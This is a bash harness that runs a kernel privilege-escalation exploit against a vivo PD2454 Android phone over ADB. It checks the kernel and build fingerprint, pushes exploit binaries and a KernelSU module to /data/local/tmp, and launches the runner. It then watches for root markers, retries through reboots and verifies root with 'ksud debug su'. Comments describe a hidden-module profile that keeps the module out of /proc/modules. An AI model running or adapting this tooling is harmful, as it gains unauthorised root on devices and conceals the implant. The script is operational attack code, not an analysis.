#!/bin/bash
# One host-side PD2454 runner: target checks, payload staging, launch,
# monitoring, evidence collection and an optional bounded reboot/retry loop.
set -u

COUNT=10
if [[ $# -gt 0 && $1 =~ ^[0-9]+$ ]]; then COUNT=$1; shift; fi
DEVICE_ID=
REBOOT_FIRST=0
DEBUG=0
while [[ $# -gt 0 ]]; do
    case "$1" in
        --device-id) [[ $# -ge 2 ]] || { echo 'missing --device-id value' >&2; exit 2; }; DEVICE_ID=$2; shift 2 ;;
        --debug) DEBUG=1; shift ;;
        --reboot-first) REBOOT_FIRST=1; shift ;;
        -h|--help) echo 'Usage: ./run.sh [attempt-count 1..100] --device-id ro.serialno [--reboot-first] [--debug]'; exit 0 ;;
        *) echo "unknown option: $1" >&2; exit 2 ;;
    esac
done
[[ $COUNT -ge 1 && $COUNT -le 100 ]] || { echo 'attempt-count must be 1..100' >&2; exit 2; }
[[ $DEVICE_ID =~ ^[A-Za-z0-9_-]+$ ]] || { echo '--device-id ro.serialno is required' >&2; exit 2; }

# Accepted (kernel release, build fingerprint) pairs, newest first. An empty
# fingerprint makes that pair's fingerprint advisory: it is logged for the
# record but not enforced, until it can be pinned from a real flash.
TARGET_PAIRS=(
    # gd489d4ad2a70 is shared by 17.2.11.5 and 17.2.12.0: the 12.0 boot image
    # kernel (carved 2026-11-13, boot_17.2.12.0.kernel) is byte-identical to
    # the 11.5 build; only the AVB descriptor fingerprint timestamp changed.
    '6.6.127-android15-8-gd489d4ad2a70-abogki567717946-4k|'
    '6.6.127-android15-8-g3b723d0e8507-abogki558056638-4k|vivo/PD2454/PD2454:17/CP2A.260605.016_V000L1/261030013318:user/release-keys'
)
ROOT=$(cd -- "$(dirname -- "$0")" && pwd)
LOG_ROOT="$ROOT/logs"
mkdir -p "$LOG_ROOT" || exit 2
JOURNAL="$LOG_ROOT/attempt-journal.log"
SERIAL=
KNOWN_ENDPOINTS=""

record() {
    line="$(date '+%Y-%m-%d %H:%M:%S') $*"
    printf '%s\n' "$line"
    if [[ $DEBUG == 1 ]]; then printf '%s\n' "$line" >> "$JOURNAL"; fi
}
adb_target() { adb -s "$SERIAL" "$@"; }
shell_target() { adb_target shell "$1" 2>/dev/null | tr -d '\r'; }

# Reconnect an already paired wireless ADB endpoint after reboot.
discover_wireless() {
    command -v dns-sd >/dev/null 2>&1 || return 0
    browse=$(mktemp) || return 0
    dns-sd -B _adb-tls-connect._tcp local. >"$browse" 2>&1 &
    dns_pid=$!; sleep 2; kill "$dns_pid" 2>/dev/null || true; wait "$dns_pid" 2>/dev/null || true
    services=$(sed -nE "s/.*(adb-${DEVICE_ID}-[A-Za-z0-9_-]+).*/\\1/p" "$browse" | sort -u)
    rm -f "$browse"
    for service in $services; do
        detail=$(mktemp) || continue
        dns-sd -L "$service" _adb-tls-connect._tcp local. >"$detail" 2>&1 &
        dns_pid=$!; sleep 2; kill "$dns_pid" 2>/dev/null || true; wait "$dns_pid" 2>/dev/null || true
        if grep -q "serial=$DEVICE_ID" "$detail"; then
            endpoint=$(sed -nE 's/.*can be reached at ([A-Za-z0-9_.-]+\.local\.):([0-9]+).*/\1:\2/p' "$detail" | head -1)
            host=${endpoint%:*}; port=${endpoint##*:}
            if [[ -n $host && $port != "$endpoint" ]]; then
                address=$(dscacheutil -q host -a name "$host" 2>/dev/null | awk '/ip_address:/{print $2;exit}')
                [[ -n $address ]] || address=$(getent ahostsv4 "$host" 2>/dev/null | awk 'NR==1{print $1}')
                case "$address" in
                    10.*|192.168.*|172.1[6-9].*|172.2?.*|172.3[01].*)
                        endpoint="$address:$port"
                        adb connect "$endpoint" >/dev/null 2>&1 || true
                        KNOWN_ENDPOINTS+=" $endpoint"
                        ;;
                esac
            fi
        fi
        rm -f "$detail"
    done
}

ready() {
    exclude_boot=${1:-}
    deadline=$(( $(date +%s) + 300 ))
    while [[ $(date +%s) -lt $deadline ]]; do
        while read -r candidate state; do
            [[ $state == device ]] || continue
            case "$candidate" in
                "$DEVICE_ID"|"adb-$DEVICE_ID-"*) ;;
                *) [[ " $KNOWN_ENDPOINTS " == *" $candidate "* ]] || continue ;;
            esac
            [[ $(adb -s "$candidate" shell getprop ro.serialno 2>/dev/null | tr -d '\r') == "$DEVICE_ID" ]] || continue
            [[ $(adb -s "$candidate" shell getprop sys.boot_completed 2>/dev/null | tr -d '\r') == 1 ]] || continue
            boot=$(adb -s "$candidate" shell cat /proc/sys/kernel/random/boot_id 2>/dev/null | tr -d '\r')
            [[ -n $boot && $boot != "$exclude_boot" ]] || continue
            SERIAL=$candidate
            record "DEVICE_READY transport=$SERIAL boot=$boot"
            return 0
        done < <(adb devices 2>/dev/null | awk 'NR>1 {print $1, $2}')
        discover_wireless
        sleep 3
    done
    return 1
}
check_target() {
    local kernel fingerprint matched expected_fp
    kernel=$(shell_target 'uname -r')
    fingerprint=$(shell_target 'getprop ro.build.fingerprint')
    matched=''
    for pair in "${TARGET_PAIRS[@]}"; do
        [[ $kernel == "${pair%%|*}" ]] && { matched=$pair; break; }
    done
    [[ -n $matched ]] || return 1
    expected_fp=${matched#*|}
    if [[ -z $expected_fp ]]; then
        record "ADVISORY fingerprint not pinned for $kernel; observed: $fingerprint"
        return 0
    fi
    [[ $fingerprint == "$expected_fp" ]]
}
pull_evidence() {
    destination=$1
    mkdir -p "$destination"
    adb_target pull /data/local/tmp/iq.log "$destination/iq.log" >/dev/null 2>&1 || true
    [[ $DEBUG == 1 ]] || return 0
    for name in ksu-trace.log ksu-init-trace.log kmsg-this-boot.txt ksu_slide; do
        adb_target pull "/data/local/tmp/$name" "$destination/$name" >/dev/null 2>&1 || true
    done
    adb_target shell 'getprop ro.boot.bootreason; getprop sys.boot.reason; getprop ro.boot.bootreasondetail' >"$destination/bootreason.txt" 2>/dev/null || true
    for remote in $(adb_target shell 'ls /data/local/tmp/pstore*.bin 2>/dev/null' 2>/dev/null | tr -d '\r'); do
        case "$remote" in /data/local/tmp/pstore*.bin) adb_target pull "$remote" "$destination/" >/dev/null 2>&1 || true;; esac
    done
}
stage_payloads() {
    for entry in bin/ic98260:ic98260 bin/ksupatch:ksupatch bin/insmodf:insmodf bin/ksuquery:ksuquery bin/ksu_exposure_probe:ksu_exposure_probe ksu/kernelsu.ko:kernelsu.ko; do
        local_file="$ROOT/${entry%:*}"; remote_name=${entry#*:}
        [[ -s $local_file ]] || { record "REFUSED missing_payload=$local_file"; return 1; }
        expected=$(shasum -a 256 "$local_file" | awk '{print $1}')
        adb_target push "$local_file" "/data/local/tmp/$remote_name" >/dev/null || return 1
        adb_target shell "chmod 755 /data/local/tmp/$remote_name" >/dev/null || return 1
        actual=$(shell_target "sha256sum /data/local/tmp/$remote_name" | awk '{print $1}')
        [[ $actual == "$expected" ]] || { record "REFUSED hash_mismatch=$remote_name"; return 1; }
    done
    adb_target shell 'rm -f /data/local/tmp/ksupatch_neuter /data/local/tmp/ksupatch_skip' >/dev/null || return 1
}
remote_has() { adb_target shell "grep -Fq '$1' /data/local/tmp/iq.log" >/dev/null 2>&1; }

# module_loaded_via_stamp: boot-scoped root-side marker (hidden-module profile
# no longer lists in /proc/modules, and the gated handshake must fail for this
# unprivileged shell). Defined at top level: the main loop calls it before
# run_attempt() has ever executed.
module_loaded_via_stamp() {
    local stamp boot_id
    stamp=$(shell_target 'cat /data/local/tmp/ksu-live.stamp 2>/dev/null' 2>/dev/null | tr -d ' \r\n')
    [[ -n $stamp ]] || return 1
    boot_id=$(shell_target 'cat /proc/sys/kernel/random/boot_id' 2>/dev/null | tr -d ' \r\n')
    [[ -n $boot_id && $stamp == "$boot_id" ]]
}

run_attempt() {
    attempt=$1; stamp=$(date +%Y%m%d-%H%M%S)
    campaign="$LOG_ROOT/camp-$stamp"; output="$campaign/attempt-$attempt"
    mkdir -p "$output" "$campaign/inherited"
    pull_evidence "$campaign/inherited"
    if ! check_target; then record 'REFUSED target_mismatch'; return 2; fi
    # module_loaded_via_stamp: boot-scoped root-side marker (hidden-module
    # profile no longer lists in /proc/modules, and the gated handshake must
    # fail for this unprivileged shell).
    if [[ -n $(shell_target "grep '^kernelsu ' /proc/modules") ]] || module_loaded_via_stamp; then
        record 'REFUSED module_or_runner_already_present'; return 2
    fi
    if [[ -n $(shell_target 'pidof ic98260') ]]; then
        record 'REFUSED runner_already_present'; return 2
    fi
    stage_payloads || { record 'REFUSED payload_staging_failed'; return 2; }
    record "ATTEMPT_LAUNCH number=$attempt"
    # Reset boot-scoped evidence from previous boots: the root exposure
    # matrix and liveness stamp must reflect THIS attempt only.
    adb_target shell 'rm -f /data/local/tmp/ksu-exposure-root.txt /data/local/tmp/ksu-live.stamp' >/dev/null 2>&1 || true
    if [[ $DEBUG == 1 ]]; then adb_target shell 'rm -f /data/local/tmp/kmsg-this-boot.txt /data/local/tmp/pstore*.bin' >/dev/null 2>&1 || true; fi
    adb_target shell "cd /data/local/tmp; rm -f iq.log hkd_base hkd_go hkd_open; KSU_RUNNER_DEBUG=$DEBUG setsid sh -c './ic98260 fake >iq.log 2>&1 </dev/null &'" >/dev/null 2>&1 || {
        record 'REFUSED launch_command_failed'; return 2;
    }
    elapsed=0; outcome=RUNNING
    while [[ $elapsed -lt ${RUN_WAIT:-300} ]]; do
        sleep 10; elapsed=$((elapsed+10))
        [[ $(adb_target get-state 2>/dev/null) == device ]] || { outcome=CRASH-INCOMPLETE; break; }
        [[ -n $(shell_target "grep '^kernelsu ' /proc/modules") ]] && { outcome=MODULE-LISTED; break; }
        if remote_has 'KSU_LOADED' || remote_has 'KernelSU Live' || remote_has 'EARLY MODULE LOAD SUCCEEDED'; then outcome=DONE; break; fi
        if remote_has 'ksu stage (finalize) worker'; then outcome=COMPLETE-NO-KSU; break; fi
        if remote_has 'burst miss -- parking' || remote_has '[-] plant1 burst missed'; then outcome=PARK-BURST; break; fi
        if remote_has 'parking without reap' || remote_has '-- parking' || remote_has '[-] child euid is not 0'; then outcome=PARK-OTHER; break; fi
        log_size=$(shell_target 'wc -c < /data/local/tmp/iq.log' | tr -d ' ')
        if [[ ${log_size:-0} -gt 0 ]] && [[ -z $(shell_target 'pidof ic98260') ]]; then outcome=PARK-OTHER; break; fi
    done
    [[ $outcome != RUNNING ]] || outcome=WINDOW-ELAPSED
    pull_evidence "$output"
    # Visibility evidence: unprivileged matrix (must be clean on hardened
    # builds), the gated handshake as an unprivileged caller (must be
    # KSU_ABSENT), and the root-side matrix recorded by the stage.
    adb_target shell /data/local/tmp/ksu_exposure_probe >"$output/exposure_unpriv.txt" 2>&1 || true
    adb_target shell /data/local/tmp/ksuquery >"$output/ksuquery_unpriv.txt" 2>&1 || true
    adb_target pull /data/local/tmp/ksu-exposure-root.txt "$output/" >/dev/null 2>&1 || true
    if [[ $DEBUG == 1 ]]; then
    adb_target shell 'getenforce; cat /proc/sys/kernel/random/boot_id; grep kernelsu /proc/modules' >"$output/state.txt" 2>&1 || true
    printf 'outcome=%s\n' "$outcome" >"$output/outcome.txt"
    fi
    record "ATTEMPT_RESULT number=$attempt outcome=$outcome evidence=$output"
    case "$outcome" in
        DONE|MODULE-LISTED)
            if [[ $DEBUG == 1 ]]; then
            adb_target shell 'timeout 5 /data/local/tmp/ksud debug info' >"$output/driver-info.txt" 2>&1 || true
            adb_target shell "timeout 5 sh -c 'printf \"id\\nexit\\n\" | /data/local/tmp/ksud debug su'" >"$output/root-check.txt" 2>&1 || true
            fi
            return 0;;
    esac
    if grep -Fq '[ksu] direct insmodf' "$output/iq.log" 2>/dev/null; then return 3; fi
    return 1
}

ready || { record 'NEEDS_DEVICE no_authenticated_boot_ready_target'; exit 2; }
check_target || { record 'REFUSED_TARGET_MISMATCH no reboot or exploit attempted'; exit 2; }
if [[ $REBOOT_FIRST -eq 1 ]]; then
    old=$(shell_target 'cat /proc/sys/kernel/random/boot_id')
    record "AUTHORIZED_INITIAL_REBOOT boot=$old"
    adb_target reboot >/dev/null 2>&1 || true
    ready "$old" || { record 'NEEDS_DEVICE reboot_did_not_return_as_fresh_boot'; exit 2; }
fi
attempt=0
while [[ $attempt -lt $COUNT ]]; do
    ready || { record 'NEEDS_DEVICE target_not_ready'; exit 2; }
    check_target || { record 'REFUSED_TARGET_MISMATCH'; exit 2; }
    # Module liveness only: a parked bootstrap process must fall through to
    # the recovery branch below (reboot/retry), not be classified as success.
    if [[ -n $(shell_target "grep '^kernelsu ' /proc/modules") ]] || module_loaded_via_stamp; then
        record 'MODULE_LISTED preserving_loaded_module'; exit 0
    fi
    old=$(shell_target 'cat /proc/sys/kernel/random/boot_id')
    if [[ -n $(shell_target 'pidof ic98260') ]]; then
        if [[ $attempt -ge $COUNT ]]; then record 'ATTEMPT_LIMIT parked_process_needs_manual_reboot'; exit 1; fi
        recovery="$LOG_ROOT/recovery-$(date +%Y%m%d-%H%M%S)"; pull_evidence "$recovery"
        record 'RECOVER_PARKED rebooting_to_clear_holders'
        adb_target reboot >/dev/null 2>&1 || true
        ready "$old" || { record 'NEEDS_DEVICE after_recovery_reboot'; exit 2; }
        continue
    fi
    attempt=$((attempt+1))
    record "ROOT_ATTEMPT number=$attempt boot=$old transport=$SERIAL"
    run_attempt "$attempt"; result=$?
    [[ $result -eq 0 ]] && exit 0
    [[ $result -eq 2 ]] && exit 2
    [[ $result -eq 3 ]] && { record 'CANDIDATE_EXECUTED_NEEDS_ANALYSIS stopping_without_retry'; exit 1; }
    [[ $attempt -lt $COUNT ]] || { record "ATTEMPT_LIMIT attempts=$attempt"; exit 1; }
    new=$(shell_target 'cat /proc/sys/kernel/random/boot_id')
    if [[ $new == "$old" ]]; then
        record "RECOVERY_REBOOT attempt=$attempt"
        adb_target reboot >/dev/null 2>&1 || true
        ready "$old" || { record 'NEEDS_DEVICE after_reboot'; exit 2; }
    fi
done
